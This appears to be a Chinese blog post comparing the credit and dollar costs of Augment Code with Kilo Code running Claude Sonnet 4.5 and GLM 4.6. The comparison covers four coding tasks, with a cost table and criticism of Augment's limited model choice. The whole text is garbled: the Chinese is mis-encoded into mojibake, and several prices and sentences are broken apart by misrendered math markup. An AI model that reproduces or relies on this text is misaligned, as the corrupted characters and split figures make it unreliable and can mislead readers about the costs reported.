<p><strong>Promptï¼š</strong> "ä¸ºä»»åŠ¡åˆ›å»ºç«¯ç‚¹æ·»åŠ éªŒè¯ middlewareã€‚éªŒè¯ title æ˜¯å¿…éœ€çš„,å¿…é¡»æ˜¯ 1-200 ä¸ªå­—ç¬¦ä¹‹é—´çš„å­—ç¬¦ä¸²ã€‚Description æ˜¯å¯é€‰çš„,ä½†å¦‚æœæä¾›å¿…é¡»å°‘äº 1000 ä¸ªå­—ç¬¦ã€‚å¯¹äºéªŒè¯å¤±è´¥è¿”å› 400 å¹¶å¸¦æœ‰å…·ä½“çš„é”™è¯¯æ¶ˆæ¯ã€‚"</p>
<p><strong>ç»“æœï¼š</strong> è¿™ä¸ªåŸºç¡€çš„è¾“å…¥éªŒè¯ä»»åŠ¡åœ¨ Augment Code ä¸Šæ¶ˆè€—äº† 519 credits($0.26)ã€‚</p>
<p>åœ¨ Kilo Code ä¸Šä½¿ç”¨ Claude Sonnet 4.5 å®Œæˆç›¸åŒä»»åŠ¡èŠ±è´¹ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.16</mn><mo separator="true">,</mo><mtext>ä½¿ç”¨</mtext><mi>G</mi><mi>L</mi><mi>M</mi><mn>4.6</mn><mtext>ä»…éœ€</mtext></mrow><annotation encoding="application/x-tex">0.16,ä½¿ç”¨ GLM 4.6 ä»…éœ€ </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord">0.16</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord cjk_fallback">ä½¿ç”¨</span><span class="mord mathnormal">G</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord">4.6</span><span class="mord cjk_fallback">ä»…éœ€</span></span></span></span></span>0.03ã€‚</p>
<p><strong>æ³¨æ„ï¼š</strong> æˆ‘ä»¬ä½¿ç”¨ç®€å•çš„æ•°å­¦è®¡ç®— Augment Code çš„ credits æˆæœ¬,å³ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>20</mn><mtext>è´­ä¹°</mtext><mn>40</mn><mo separator="true">,</mo><mn>000</mn><mi>c</mi><mi>r</mi><mi>e</mi><mi>d</mi><mi>i</mi><mi>t</mi><mi>s</mi><mo>=</mo><mtext>æ¯ä¸ª</mtext><mi>c</mi><mi>r</mi><mi>e</mi><mi>d</mi><mi>i</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">20 è´­ä¹° 40,000 credits = æ¯ä¸ª credit </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord">20</span><span class="mord cjk_fallback">è´­ä¹°</span><span class="mord">40</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">000</span><span class="mord mathnormal">cre</span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord cjk_fallback">æ¯ä¸ª</span><span class="mord mathnormal">cre</span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span></span></span></span></span>0.0005ã€‚</p>
<h3 data-id="heading-3">ä»»åŠ¡ #2ï¼šé‡æ„ä¸º Repository Pattern</h3>
<p><strong>Promptï¼š</strong> "å°†åŸºäºæ–‡ä»¶çš„å­˜å‚¨é‡æ„ä¸ºé€‚å½“çš„æ•°æ®è®¿é—®å±‚ã€‚åˆ›å»ºä¸€ä¸ª TaskRepository ç±»,åŒ…å«ä»¥ä¸‹æ–¹æ³•ï¼šgetAll()ã€getById(id)ã€create(task)ã€update(id, task)ã€delete(id)ã€‚repository åº”è¯¥æ­£ç¡®å¤„ç†æ–‡ä»¶ I/O å’Œé”™è¯¯ã€‚æ›´æ–°è·¯ç”±ä»¥ä½¿ç”¨è¿™ä¸ª repository è€Œä¸æ˜¯ç›´æ¥è®¿é—®æ–‡ä»¶ã€‚"</p>
<p><strong>ç»“æœï¼š</strong> è¿™ä¸ªæ¶æ„é‡æ„åœ¨ Augment Code ä¸Šæ¶ˆè€—äº† 1,218 credits($0.61)ã€‚</p>
<p>Kilo Code ä½¿ç”¨ Claude Sonnet 4.5 èŠ±è´¹ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.16</mn><mo separator="true">,</mo><mtext>è€Œ</mtext><mi>G</mi><mi>L</mi><mi>M</mi><mn>4.6</mn><mtext>å¤„ç†å®ƒèŠ±è´¹</mtext></mrow><annotation encoding="application/x-tex">0.16,è€Œ GLM 4.6 å¤„ç†å®ƒèŠ±è´¹ </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord">0.16</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord cjk_fallback">è€Œ</span><span class="mord mathnormal">G</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord">4.6</span><span class="mord cjk_fallback">å¤„ç†å®ƒèŠ±è´¹</span></span></span></span></span>0.09ã€‚</p>
<h3 data-id="heading-4">ä»»åŠ¡ #3ï¼šæ·»åŠ ä¼˜å…ˆçº§å’Œæˆªæ­¢æ—¥æœŸåŠŸèƒ½</h3>
<p><strong>Promptï¼š</strong> "ä¸ºä»»åŠ¡æ·»åŠ  priority(highã€mediumã€low)å’Œ dueDate å­—æ®µã€‚æ›´æ–° Task interface,æ·»åŠ è¿‡æ»¤ç«¯ç‚¹ GET /api/tasks?priority=high å’Œ GET /api/tasks/overdue ç”¨äºæŸ¥è¯¢å·²è¿‡æˆªæ­¢æ—¥æœŸçš„ä»»åŠ¡ã€‚åŒ…å«é€‚å½“çš„ TypeScript ç±»å‹ã€‚"</p>
<p><strong>ç»“æœï¼š</strong> æ·»åŠ è¿™äº›æ–°å­—æ®µå’Œç«¯ç‚¹åœ¨ Augment Code ä¸Šæ¶ˆè€—äº† 1,248 credits($0.62)ã€‚</p>
<p>ä½¿ç”¨ Kilo Code ä¸Šçš„ Claude Sonnet 4.5 å®ç°ç›¸åŒåŠŸèƒ½èŠ±è´¹ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.43</mn><mo separator="true">,</mo><mtext>æˆ–ä½¿ç”¨</mtext><mi>G</mi><mi>L</mi><mi>M</mi><mn>4.6</mn><mtext>èŠ±è´¹</mtext></mrow><annotation encoding="application/x-tex">0.43,æˆ–ä½¿ç”¨ GLM 4.6 èŠ±è´¹ </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord">0.43</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord cjk_fallback">æˆ–ä½¿ç”¨</span><span class="mord mathnormal">G</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord">4.6</span><span class="mord cjk_fallback">èŠ±è´¹</span></span></span></span></span>0.20ã€‚</p>
<h3 data-id="heading-5">ä»»åŠ¡ #4ï¼šç¼–å†™æµ‹è¯•å’Œæ–‡æ¡£</h3>
<p><strong>Promptï¼š</strong> "ä¸º TaskRepository ç±»ç¼–å†™ Jest å•å…ƒæµ‹è¯•,æµ‹è¯•æ‰€æœ‰ CRUD æ“ä½œ,åŒ…æ‹¬é”™è¯¯æƒ…å†µã€‚Mock æ–‡ä»¶ç³»ç»Ÿã€‚åŒæ—¶ä¸ºæ‰€æœ‰å…¬å…±æ–¹æ³•ç”Ÿæˆ JSDoc æ³¨é‡Š,å¹¶åˆ›å»ºä¸€ä¸ª README.md,åŒ…å« API æ–‡æ¡£,åŒ…æ‹¬ç¤ºä¾‹è¯·æ±‚å’Œå“åº”ã€‚"</p>
<p><strong>ç»“æœï¼š</strong> è¿™ä¸ªæœ€åçš„ä»»åŠ¡åœ¨ Augment Code ä¸Šæ¶ˆè€—äº† 1,337 credits($0.67)ã€‚</p>
<p>åœ¨ Kilo Code ä¸Š,ä½¿ç”¨ Claude Sonnet 4.5 èŠ±è´¹ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.56</mn><mtext>ã€‚</mtext><mi>G</mi><mi>L</mi><mi>M</mi><mn>4.6</mn><mtext>åœ¨è®¾ç½®</mtext><mi>J</mi><mi>e</mi><mi>s</mi><mi>t</mi><mtext>æ—¶ç¨æœ‰å›°éš¾</mtext><mo separator="true">,</mo><mtext>éœ€è¦æ›´å¤šè¿­ä»£</mtext><mo separator="true">,</mo><mtext>èŠ±è´¹</mtext></mrow><annotation encoding="application/x-tex">0.56ã€‚GLM 4.6 åœ¨è®¾ç½® Jest æ—¶ç¨æœ‰å›°éš¾,éœ€è¦æ›´å¤šè¿­ä»£,èŠ±è´¹ </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord">0.56</span><span class="mord cjk_fallback">ã€‚</span><span class="mord mathnormal">G</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord">4.6</span><span class="mord cjk_fallback">åœ¨è®¾ç½®</span><span class="mord mathnormal" style="margin-right:0.09618em;">J</span><span class="mord mathnormal">es</span><span class="mord mathnormal">t</span><span class="mord cjk_fallback">æ—¶ç¨æœ‰å›°éš¾</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord cjk_fallback">éœ€è¦æ›´å¤šè¿­ä»£</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord cjk_fallback">èŠ±è´¹</span></span></span></span></span>0.52ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/065c79bc9f614b2b8d15ff38e5a0dd9b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piv6a2U5Li45ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767966980&amp;x-signature=iNlI4P5EF1g8GZBFi4IBAdXX4t8%3D" alt="è¿è¡Œå®Œæ‰€æœ‰å››ä¸ªä»»åŠ¡åçš„ Augment Code" loading="lazy"/></p>
<h2 data-id="heading-6">æ€»æˆæœ¬æ¯”è¾ƒ</h2>
<p>è¿è¡Œå®Œæ‰€æœ‰å››ä¸ªä»»åŠ¡å,è¿™æ˜¯å®Œæ•´çš„æˆæœ¬æ˜ç»†ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/410798a09a2f467a8745bdd1c35ee480~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piv6a2U5Li45ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767966980&amp;x-signature=FPTf1DIq9vfdSEFGySq3UVovlyA%3D" alt="æ€»æˆæœ¬å¯¹æ¯”" loading="lazy"/></p>















































<table><thead><tr><th>ä»»åŠ¡</th><th>Augment Code Credits</th><th>Augment Code æˆæœ¬</th><th>Kilo Code (Claude Sonnet 4.5)</th><th>Kilo Code (GLM 4.6)</th></tr></thead><tbody><tr><td>ä»»åŠ¡ #1ï¼šæ·»åŠ éªŒè¯ Middleware</td><td>519</td><td>$0.26</td><td>$0.16</td><td>$0.03</td></tr><tr><td>ä»»åŠ¡ #2ï¼šé‡æ„ä¸º Repository Pattern</td><td>1,218</td><td>$0.61</td><td>$0.16</td><td>$0.09</td></tr><tr><td>ä»»åŠ¡ #3ï¼šæ·»åŠ ä¼˜å…ˆçº§å’Œæˆªæ­¢æ—¥æœŸ</td><td>1,248</td><td>$0.62</td><td>$0.43</td><td>$0.20</td></tr><tr><td>ä»»åŠ¡ #4ï¼šç¼–å†™æµ‹è¯•å’Œæ–‡æ¡£</td><td>1,337</td><td>$0.67</td><td>$0.56</td><td>$0.52</td></tr><tr><td><strong>æ€»è®¡</strong></td><td><strong>4,322</strong></td><td><strong>$2.16</strong></td><td><strong>$1.31</strong></td><td><strong>$0.84</strong></td></tr></tbody></table>
<p><em>Augment Code çš„ credits æŒ‰ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>20</mn><mtext>è´­ä¹°</mtext><mn>40</mn><mo separator="true">,</mo><mn>000</mn><mi>c</mi><mi>r</mi><mi>e</mi><mi>d</mi><mi>i</mi><mi>t</mi><mi>s</mi><mo>=</mo><mtext>æ¯ä¸ª</mtext><mi>c</mi><mi>r</mi><mi>e</mi><mi>d</mi><mi>i</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">20 è´­ä¹° 40,000 credits = æ¯ä¸ª credit </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord">20</span><span class="mord cjk_fallback">è´­ä¹°</span><span class="mord">40</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">000</span><span class="mord mathnormal">cre</span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord cjk_fallback">æ¯ä¸ª</span><span class="mord mathnormal">cre</span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span></span></span></span></span>0.0005 è®¡ç®—</em></p>
<p>å”‰â€¦â€¦è¿™å‡ºä¹æ„æ–™ã€‚</p>
<p><strong>è¿™ä¸€åˆ‡æ„å‘³ç€ä»€ä¹ˆï¼š</strong> Augment Code çš„ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>20</mn><mtext>æ–¹æ¡ˆæ¯æœˆæä¾›</mtext><mn>40</mn><mo separator="true">,</mo><mn>000</mn><mi>c</mi><mi>r</mi><mi>e</mi><mi>d</mi><mi>i</mi><mi>t</mi><mi>s</mi><mtext>ã€‚è¿™å››ä¸ªä»»åŠ¡åœ¨å¤§çº¦</mtext><mn>2</mn><mo>âˆ’</mo><mn>3</mn><mtext>å°æ—¶çš„å¼€å‘å·¥ä½œä¸­æ¶ˆè€—äº†è¶…è¿‡</mtext><mn>10</mn></mrow><annotation encoding="application/x-tex">20 æ–¹æ¡ˆæ¯æœˆæä¾› 40,000 creditsã€‚è¿™å››ä¸ªä»»åŠ¡åœ¨å¤§çº¦ 2-3 å°æ—¶çš„å¼€å‘å·¥ä½œä¸­æ¶ˆè€—äº†è¶…è¿‡ 10% çš„æœˆåº¦é¢åº¦ã€‚æ¨ç®—åˆ°å®Œæ•´çš„ 8 å°æ—¶å·¥ä½œæ—¥,åŒ…æ‹¬å…¸å‹çš„è¿­ä»£å’Œè°ƒè¯•,ä½ æ¯å¤©ä¼šæ¶ˆè€— 13,000-17,000 creditsã€‚æ¢å¥è¯è¯´,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord">20</span><span class="mord cjk_fallback">æ–¹æ¡ˆæ¯æœˆæä¾›</span><span class="mord">40</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">000</span><span class="mord mathnormal">cre</span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal">s</span><span class="mord cjk_fallback">ã€‚è¿™å››ä¸ªä»»åŠ¡åœ¨å¤§çº¦</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord">3</span><span class="mord cjk_fallback">å°æ—¶çš„å¼€å‘å·¥ä½œä¸­æ¶ˆè€—äº†è¶…è¿‡</span><span class="mord">10</span></span></span></span></span>20 çš„æ–¹æ¡ˆåªèƒ½ç»´æŒ 1-2 å¤©ã€‚éš¾æ€ªè¿™ä¹ˆå¤šäººåœ¨æŠ±æ€¨ã€‚</p>
<p>Augment Code çš„å®šä»·æ›´æ–°åšå‡ºäº†å…·ä½“å£°æ˜ï¼š"Completions &amp; Next Edit ç”¨æˆ·é€šå¸¸é€‚åˆ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>20</mn><mi mathvariant="normal">/</mi><mtext>æœˆæ–¹æ¡ˆ</mtext><mi mathvariant="normal">"</mi><mo separator="true">,</mo><mtext>è€Œ</mtext><mi mathvariant="normal">"</mi><mtext>æ¯å¤©ä½¿ç”¨</mtext><mi>A</mi><mi>g</mi><mi>e</mi><mi>n</mi><mi>t</mi><mtext>å®Œæˆå‡ ä¸ªä»»åŠ¡çš„ç”¨æˆ·é€šå¸¸åœ¨</mtext></mrow><annotation encoding="application/x-tex">20/æœˆæ–¹æ¡ˆ",è€Œ"æ¯å¤©ä½¿ç”¨ Agent å®Œæˆå‡ ä¸ªä»»åŠ¡çš„ç”¨æˆ·é€šå¸¸åœ¨ </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">20/</span><span class="mord cjk_fallback">æœˆæ–¹æ¡ˆ</span><span class="mord">"</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord cjk_fallback">è€Œ</span><span class="mord">"</span><span class="mord cjk_fallback">æ¯å¤©ä½¿ç”¨</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord cjk_fallback">å®Œæˆå‡ ä¸ªä»»åŠ¡çš„ç”¨æˆ·é€šå¸¸åœ¨</span></span></span></span></span>60-<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>200</mn><mi mathvariant="normal">/</mi><mtext>æœˆä¹‹é—´</mtext><mi mathvariant="normal">"</mi><mtext>ã€‚æˆ‘ä»¬çš„æµ‹è¯•æ˜¾ç¤ºäº†ä¸åŒçš„ç°å®ï¼šæ¨ç®—åˆ°å®é™…çš„æ—¥å¸¸å¼€å‘</mtext><mo separator="true">,</mo><mtext>æˆæœ¬å°†è¾¾åˆ°</mtext></mrow><annotation encoding="application/x-tex">200/æœˆä¹‹é—´"ã€‚æˆ‘ä»¬çš„æµ‹è¯•æ˜¾ç¤ºäº†ä¸åŒçš„ç°å®ï¼šæ¨ç®—åˆ°å®é™…çš„æ—¥å¸¸å¼€å‘,æˆæœ¬å°†è¾¾åˆ° </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">200/</span><span class="mord cjk_fallback">æœˆä¹‹é—´</span><span class="mord">"</span><span class="mord cjk_fallback">ã€‚æˆ‘ä»¬çš„æµ‹è¯•æ˜¾ç¤ºäº†ä¸åŒçš„ç°å®ï¼šæ¨ç®—åˆ°å®é™…çš„æ—¥å¸¸å¼€å‘</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord cjk_fallback">æˆæœ¬å°†è¾¾åˆ°</span></span></span></span></span>300-$600/æœˆ,è¿œè¿œè¶…è¿‡ä»–ä»¬çš„ä¼°è®¡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be8f098d05e747c3bd5d28954a2afb6a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piv6a2U5Li45ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767966980&amp;x-signature=ENbR483U29N0jNpo4XhZlwN%2FHsg%3D" alt="Augment Code å®šä»·æ›´æ–°åšå®¢æ–‡ç« ä¸­çš„ä½¿ç”¨å»ºè®®" loading="lazy"/></p>
<p>é™¤äº†æ€»æˆæœ¬ä¹‹å¤–,æˆ‘ä»¬è¿˜å‘ç° Augment Code é€šè¿‡å°†ä½ é™åˆ¶åœ¨å››ä¸ª premium æ¨¡å‹ä¸Š,æ¥é™åˆ¶ä½ å¦‚ä½•åœ¨ä»»åŠ¡ä¹‹é—´åˆ†é…æ”¯å‡ºã€‚</p>
<p>ç›¸æ¯”ä¹‹ä¸‹,Kilo é‡‡ç”¨ 100% å¼€æ”¾æ¨¡å‹æ–¹æ³•,è¿™æ„å‘³ç€ä½ å¯ä»¥é€šè¿‡ä»»ä½• AI æä¾›å•†ä½¿ç”¨(å‡ ä¹)ä»»ä½• AI æ¨¡å‹ã€‚</p>
<h2 data-id="heading-7">æœ‰é™æ¨¡å‹é€‰æ‹©çš„é—®é¢˜</h2>
<p>æˆªè‡³ 2025 å¹´ 11 æœˆ,Augment Code æä¾›å››ä¸ªæ¨¡å‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a01af8f6e2bf462092770e1efbe394c7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piv6a2U5Li45ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767966980&amp;x-signature=mYX8quAIzz%2Bw4Gk4jg7quQY2g2U%3D" alt="Augment Code çš„æ¨¡å‹é€‰æ‹©å™¨ï¼Œä»…æœ‰ 4 ä¸ªå¯ç”¨æ¨¡å‹" loading="lazy"/></p>
<p>æ‰€æœ‰å››ä¸ªéƒ½æ˜¯å®šä»·é«˜æ˜‚çš„ premium æ¨¡å‹ã€‚è¿™ç§æœ‰é™çš„é€‰æ‹©é€ æˆäº†æˆæœ¬æ•ˆç‡ä½ä¸‹ï¼š</p>
<p>æ·»åŠ éªŒè¯æˆ–æ ¼å¼åŒ–ä»£ç ç­‰ç®€å•ä»»åŠ¡ä»ç„¶ä»¥ premium è´¹ç‡æ¶ˆè€— creditsã€‚è¿™äº›ä»»åŠ¡ç”¨é¢„ç®—æ¨¡å‹å°±å¯ä»¥å¾ˆå¥½åœ°å®Œæˆã€‚å¦‚æœä½ æƒ³ä¼˜åŒ–æˆæœ¬,å¯¹ç®€å•ä»»åŠ¡ä½¿ç”¨ premium æ¨¡å‹ç›¸å½“äºç”¨è¶…çº§è®¡ç®—æœºè¿è¡Œè®¡ç®—å™¨åº”ç”¨ã€‚</p>
<h3 data-id="heading-8">ä»·æ ¼ä¸ OpenAI å’Œ Anthropic çš„è´¹ç‡ç›¸åŒ</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e0fe4a43166a4cb8b9a7563a7fb589eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piv6a2U5Li45ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767966980&amp;x-signature=7EDEFKFlxSeOS0BeANPhsqZkXCk%3D" alt="ä»·æ ¼åæ˜  OpenAI å’Œ Anthropic çš„è´¹ç‡" loading="lazy"/></p>
<p>æˆ‘ä»¬é€šè¿‡ Kilo Code ä½¿ç”¨ Z.ai çš„ GLM 4.6 ç›´æ¥æµ‹è¯•äº†è¿™ç§"ç®€å•ä»»åŠ¡ç”¨é¢„ç®—æ¨¡å‹"çš„æ–¹æ³•ã€‚GLM 4.6 ä»¥å‡ åˆ†é’±çš„æˆæœ¬å¤„ç†äº†å‰ä¸‰ä¸ªä»»åŠ¡ã€‚ç„¶è€Œ,ä»»åŠ¡ 4 æ›´å¤æ‚,ä½¿ç”¨ GLM 4.6 çš„æˆæœ¬ä¸Šå‡åˆ° $0.52,å› ä¸ºå®ƒéœ€è¦æ›´å¤šè¿­ä»£ã€‚åœ¨çœŸå®å·¥ä½œæµä¸­,ä½ å¯ä»¥ä¸ºç®€å•ä»»åŠ¡é€‰æ‹© GLM 4.6 æˆ–ç±»ä¼¼çš„å°å‹æ¨¡å‹,å½“ä½ çŸ¥é“ä»»åŠ¡æ›´å›°éš¾æ—¶åˆ‡æ¢åˆ°æ›´å¼ºå¤§çš„æ¨¡å‹(å¦‚ Claude Sonnet 4.5 æˆ– OpenAI GPT-5),ç®€å•ä»»åŠ¡çš„æˆæœ¬ä¼šæ¯”è¿™äº›å¼ºå¤§æ¨¡å‹ä¾¿å®œå¾—å¤šã€‚</p>
<h3 data-id="heading-9">ä»·æ ¼ä¸ OpenRouter API å®šä»·ç›¸åŒ</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b77c73ad53664f02bfd97e508e54d712~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piv6a2U5Li45ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767966980&amp;x-signature=1kyaRCXbgsH18BA3XBj5j1LY8gw%3D" alt="ä»·æ ¼åæ˜  OpenRouter API å®šä»·" loading="lazy"/></p>
<p>Kilo Code æä¾›æ¥è‡ªå¤šä¸ªæä¾›å•†çš„æ•°ç™¾ä¸ªæ¨¡å‹çš„è®¿é—®ã€‚ä½ å¯ä»¥ä¸ºæ—¥å¸¸å·¥ä½œä½¿ç”¨é¢„ç®—æ¨¡å‹,ä¸ºå¤æ‚é—®é¢˜ä½¿ç”¨æœ€å…ˆè¿›çš„æ¨¡å‹ã€‚</p>
<p>è¿˜å€¼å¾—æ³¨æ„çš„æ˜¯,Augment Code ä¸­çš„æ¨¡å‹é™åˆ¶ä¸ä»…ä»…æ˜¯æ¨¡å‹é€‰æ‹©ã€‚ä½¿ç”¨ reasoning models æ—¶,ä½ ä¹Ÿæ— æ³•è°ƒæ•´ reasoning effort çº§åˆ«ã€‚</p>
<p>åœ¨ Kilo Code ä¸­,ä½ å¯ä»¥æ ¹æ®ä»»åŠ¡å¤æ‚åº¦å°† GPT-5 ç­‰æ¨¡å‹è®¾ç½®ä¸ºé«˜ã€ä¸­æˆ–ä½ reasoning effortã€‚Reasoning æ˜¯ AI æ¨¡å‹åœ¨æä¾›ç­”æ¡ˆä¹‹å‰é€æ­¥"æ€è€ƒ"é—®é¢˜çš„è¿‡ç¨‹,ç±»ä¼¼äºäººç±»åœ¨æœ€ç»ˆç¡®å®šè§£å†³æ–¹æ¡ˆä¹‹å‰åœ¨çº¸ä¸Šè§£å†³å¤æ‚é—®é¢˜çš„æ–¹å¼ã€‚æ›´é«˜çš„ reasoning èƒ½æ”¹å–„å¤æ‚ä»»åŠ¡çš„ç»“æœ,ä½†æˆæœ¬æ›´é«˜ã€‚æ›´ä½çš„ reasoning åœ¨ç®€å•ä»»åŠ¡ä¸ŠèŠ‚çœèµ„é‡‘,é€šå¸¸ä¼šäº§ç”Ÿæ›´å¿«çš„å“åº”æ—¶é—´ã€‚Augment Code é”å®šäº†è¿™äº›è®¾ç½®,ç§»é™¤äº†å¦ä¸€ä¸ªæˆæœ¬å’Œæ€§èƒ½ä¼˜åŒ–çš„æ‰‹æ®µã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2060e072bb4443c4b13dbbfa0e652a39~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piv6a2U5Li45ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767966980&amp;x-signature=19bwTmTZiBLRTVLYW%2F4IGV%2Fj5kc%3D" alt="Kilo Code æ¨¡å‹ reasoning effort è®¾ç½®" loading="lazy"/></p>
<h2 data-id="heading-10">å®æ—¶æˆæœ¬è·Ÿè¸ª</h2>
<p>Augment Code ä¸æä¾›æ¯ä¸ª prompt çš„æˆæœ¬å¯è§æ€§ã€‚ä½ å¯ä»¥åœ¨åˆ†æä»ªè¡¨æ¿ä¸­çœ‹åˆ°æ€»ä½¿ç”¨æƒ…å†µ(æ¯æ—¥æ¶ˆè€—å’Œæ¨¡å‹åˆ†å¸ƒ),ä½†æ— æ³•è·Ÿè¸ªå•ä¸ªæ“ä½œçš„æˆæœ¬ã€‚è¿™ä½¿å¾—å®æ—¶ä¼˜åŒ–å·¥ä½œæµå˜å¾—å›°éš¾ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3b065f50f9c43df8ff5c887a3795e2e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piv6a2U5Li45ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767966980&amp;x-signature=ScMAb7iPETqyBwM9SaHMv7LsOTA%3D" alt="Augment Code åˆ†æ dashboardï¼Œä»…æ˜¾ç¤ºæ±‡æ€»æ•°æ®" loading="lazy"/></p>
